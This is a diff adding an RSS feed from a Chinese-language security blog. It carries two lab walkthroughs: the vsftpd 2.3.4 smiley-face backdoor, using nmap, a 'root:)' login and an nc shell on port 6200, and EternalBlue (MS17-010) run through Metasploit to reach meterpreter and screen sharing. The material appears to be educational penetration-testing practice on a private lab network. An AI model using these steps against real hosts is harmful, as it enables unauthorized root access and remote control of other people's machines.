@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>kali on cjj-blog</title>
+    <link>https://example.com/categories/kali/</link>
+    <description>Recent content in kali on cjj-blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 13 Jun 2021 18:45:05 +0800</lastBuildDate><atom:link href="https://example.com/categories/kali/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>vsftp笑脸漏洞</title>
+      <link>https://example.com/p/vsftp%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Sun, 13 Jun 2021 18:45:05 +0800</pubDate>
+      
+      <guid>https://example.com/p/vsftp%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/</guid>
+      <description>介绍： VSFTP是一个基于GPL发布的类Unix系统上使用的FTP服务器软件，它的全称是Very Secure FTP 。
+vsftpd-2.3.4早期版本存在恶意的后门，通过登录名中嵌入 :) 两个连续符号而触发的漏洞，因外形酷似笑脸而得名。
+演示   扫描目的主机
+打开kali使用nmap对目的主机进行扫描(目的主机地址为192.168.43.9)
+nmap --script ftp-vsftpd-backdoor 192.168.43.9 
+  触发笑脸漏洞
+在命令行里接着用ftp尝试登录目的主机
+ftp 192.168.43.9
+这里提示我们输入用户名，我们目的是拿到最高权限，即用root账户登录靶机
+用户名我们输入root：）
+密码随便输入后点击回车等待
+
+  开始渗透靶机
+打开一个新的命令行，用nc连接靶机
+nc 192.168.43.9 6200回车后现在就已经连接上了靶机
+
+验证下是否渗透成功
+输入id查看当前登录用户
+
+看到确实是root用户登录
+  </description>
+    </item>
+    
+    <item>
+      <title>永恒之蓝</title>
+      <link>https://example.com/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</link>
+      <pubDate>Sun, 13 Jun 2021 18:28:05 +0800</pubDate>
+      
+      <guid>https://example.com/p/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</guid>
+      <description>永恒之蓝漏洞渗透测试   开启渗透测试工具msfconsole
+打开终端输入msfconsole回车
+  
+ 找到永恒之蓝漏洞
+搜索永恒之蓝漏洞代号ms17-010
+search ms17-010  
+这里2号就是我们要找的漏洞
+选择这个漏洞
+use 2
+ 设置添加字段
+可以使用show options查看当前漏洞的可选选项
+  
+这里有两个必须添加的字段：RHOSTS和RPORT
+set rhosts 192.168.43.252set rport 445
+ 开始渗透
+输入run 或 explit开始渗透
+
+当看到meterpreter即为成功，现在就可以像操作目标主机的命令行一样操作主机了
+例如，屏幕分享
+screenshare
+这时会打开浏览器将目的主机的页面实时显示在浏览器页面</description>
+    </item>
+    
+  </channel>
+</rss>
